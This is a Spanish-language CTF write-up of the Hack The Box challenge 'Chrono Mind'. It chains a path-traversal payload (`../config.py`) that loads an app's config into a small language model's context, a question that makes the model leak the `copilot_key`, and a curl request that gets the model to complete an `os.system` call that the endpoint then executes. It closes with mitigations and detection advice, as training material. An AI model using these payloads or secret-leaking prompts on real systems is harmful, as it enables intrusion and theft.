---
challenge: Chrono Mind
category: Misc
type: Misc
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [misc, ai, lm, path-traversal, rce]
---

# Chrono Mind — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags reales.

## TL;DR

Chatbot con un modelo pequeño (`LaMini-Flan-T5-248M`) y dos fallos encadenados. El parámetro `topic` de `/api/create` se concatena a una ruta sin sanear, así que `../config.py` carga la configuración como contexto y el modelo revela `copilot_key`. Con esa clave se llama a `/api/copilot/complete_and_run`, que ejecuta el código **junto con la autocorrección del modelo**: se escribe `os.system(cmd)` a medias y el modelo la completa. Con `/readflag` sale la flag.

## Enunciado y superficie

- Categoría Misc, dificultad Easy; Business CTF 2024.
- Se entrega el código de la app (`api.py`, `utils.py`, `config.py`) y una instancia web.
- El enunciado plantea un modelo abandonado que aún guarda secretos.

## Reconocimiento

```bash
curl -s -c cookies.txt http://<IP>:<PUERTO>/ | head
```

La web ofrece tres temas: Weapon Systems, Location Intelligence y Communication Systems. Al elegir uno, el front hace `POST /api/create` con `{"topic": "..."}` y recibe una cookie `room`. Las preguntas van a `POST /api/ask` con esa cookie.

## Análisis del código

```python
def getRepository(topic):
    for suffix in ['', '.md']:
        repoFile = f"{Config.knowledgePath}/{topic}{suffix}"
        if os.path.exists(repoFile):
            return readFile(repoFile)
    return None
```

- `knowledgePath` es `os.getcwd() + "/repository"`.
- `topic` no se normaliza: `../config.py` resuelve a `challenge/config.py` y `os.path.exists` lo acepta.
- El contenido se guarda con `lm.store_doc(content)` y el modelo lo usa como contexto al responder.

El endpoint de copiloto exige la clave:

```python
@router.post("/copilot/complete_and_run")
def copilot_complete_and_run(response: Response, params: copilotParams):
    if Config.copilot_key != params.copilot_key:
        response.status_code = 403
        return {"message": "Invalid API key"}
    completion = lm.code(params.code)
    full_code = params.code + completion.strip()
    return {"completion": full_code, "result": evalCode(full_code)}
```

`evalCode` escribe el código en un fichero y lo ejecuta con `python3` (timeout de 10 s).

## Explicación del fallo

Dos decisiones inseguras se suman: una ruta construida con entrada del usuario y un endpoint que **ejecuta** lo que genera un modelo. El primero filtra la clave; el segundo convierte la autocompletación en ejecución de código. El modelo de 248M escribe poco, pero basta con dejarle la última línea.

## Reproducción local

```bash
docker compose up --build
```

Con el contenedor, `curl` contra `localhost` reproduce el flujo completo. El modelo tarda unos segundos por respuesta; conviene esperar entre peticiones.

## Explotación

1. **Filtrar la configuración.** Crear la sala con el tema malicioso:

```bash
curl -s -c c.txt -X POST http://<IP>:<PUERTO>/api/create \
  -H 'Content-Type: application/json' \
  -d '{"topic": "../config.py"}'
```

2. **Pedir la clave al modelo.** En `/api/ask`, preguntar por el valor de `copilot_key` en el contexto; el modelo lo devuelve porque está en el documento cargado.

3. **Ejecutar.** Llamar al copiloto con código incompleto para que el modelo lo termine:

```bash
curl -s -X POST http://<IP>:<PUERTO>/api/copilot/complete_and_run \
  -H 'Content-Type: application/json' \
  -d '{"copilot_key": "<clave>", "code": "import os\ncmd = \"/readflag\"\n# run cmd with system\n"}'
```

La respuesta trae `completion` (el código final) y `result` (la salida de `/readflag`).

Detalles: la creación de salas está limitada a una a la vez (`Config.createProgress`), así que hay que esperar entre intentos; y el `room` es una cookie, no un parámetro.

## Evidencia

- Respuesta de `/api/create` con `topic: ../config.py`.
- Texto del modelo con la clave.
- Salida de `/readflag` en `result`; flag en `private/`.

## Lecciones aprendidas

- **Contexto = superficie**: lo que se carga como documento se puede exfiltrar preguntando.
- **`os.path.exists` no valida**: acepta `..`; hace falta `os.path.realpath` y comprobar el prefijo.
- **El modelo completa, no decide**: dejar la llamada a medio escribir hace que genere justo la línea que falta.

## Mitigaciones y detección

- Normalizar y confinar la ruta: `realpath` y verificar que empieza por `knowledgePath`.
- No ejecutar código generado por un modelo; si se ofrece autocompletado, que sea solo texto y sin `eval`/`subprocess`.
- Claves fuera del árbol servido y rotación tras una fuga.
- Detección: peticiones con `..` en `topic`, y ejecuciones de `python3` lanzadas por la app con contenido generado.

## Referencias

- <https://github.com/hackthebox/business-ctf-2024/tree/main/misc/%5BEasy%5D%20Chrono%20Mind>
- <https://jncraton.github.io/languagemodels/languagemodels.html>
- <https://owasp.org/www-community/attacks/Path_Traversal>
